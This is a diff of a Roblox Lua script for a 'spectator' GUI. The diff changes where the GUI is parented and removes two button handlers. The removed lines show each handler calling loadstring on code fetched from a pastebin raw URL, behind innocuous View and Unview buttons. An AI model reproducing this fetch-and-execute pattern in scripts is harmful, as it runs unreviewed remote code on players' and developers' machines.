@@ -14,7 +14,7 @@ local PlayerIcon = Instance.new("ImageLabel")
 --Properties:
 
 spectator.Name = "spectator"
-spectator.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+spectator.Parent = game.ReplicatedStorage
 spectator.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 spectator.ResetOnSpawn = false
 
@@ -87,52 +87,14 @@ PlayerIcon.Image = "rbxassetid://131615334142719"
 
 -- Scripts:
 
-local function QUSQ_fake_script() -- ViewButton.LocalScript 
-	local script = Instance.new('LocalScript', ViewButton)
-
-	-- LocalScript inside the TextButton
-	
-	local HttpService = game:GetService("HttpService")
-	local button = script.Parent
-	
-	button.MouseButton1Click:Connect(function()
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
-		end)
-	
-		if not success then
-			warn("Error running script:", err)
-		end
-	end)
-end
-coroutine.wrap(QUSQ_fake_script)()
-local function XBTSTC_fake_script() -- Frame.LocalScript 
+local function JXLMGR_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	script.Parent.Active = true
 	script.Parent.Draggable = true
 end
-coroutine.wrap(XBTSTC_fake_script)()
-local function RYYQCFG_fake_script() -- UnviewButton.LocalScript 
-	local script = Instance.new('LocalScript', UnviewButton)
-
-	-- LocalScript inside the TextButton
-	
-	local HttpService = game:GetService("HttpService")
-	local button = script.Parent
-	
-	button.MouseButton1Click:Connect(function()
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
-		end)
-	
-		if not success then
-			warn("Error running script:", err)
-		end
-	end)
-end
-coroutine.wrap(RYYQCFG_fake_script)()
-local function TSGBDLO_fake_script() -- Frame.LocalScript 
+coroutine.wrap(JXLMGR_fake_script)()
+local function JIXBN_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	
@@ -240,4 +202,4 @@ local function TSGBDLO_fake_script() -- Frame.LocalScript
 	end)
 	
 end
-coroutine.wrap(TSGBDLO_fake_script)()
+coroutine.wrap(JIXBN_fake_script)()
